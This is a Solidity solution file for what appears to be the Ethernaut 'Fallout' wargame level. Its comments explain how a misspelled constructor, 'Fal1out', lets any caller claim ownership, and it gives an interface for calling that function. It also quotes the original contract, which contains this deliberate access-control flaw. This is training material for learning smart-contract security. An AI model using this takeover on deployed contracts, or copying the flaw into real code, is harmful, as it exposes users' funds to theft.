// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal: claim ownership of contract

// Old version of solidity: no constructor
// Constructor is a function with same name as contract
// But there is a type in the function name: Fal1out (instead of Fallout)
// This is the vulnerability!
// Get contract address of deployed contract
// Load this contract from its address in Remix
// Call function

interface Fallout {
    function Fal1out() external payable;
}


// Original contract below:
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}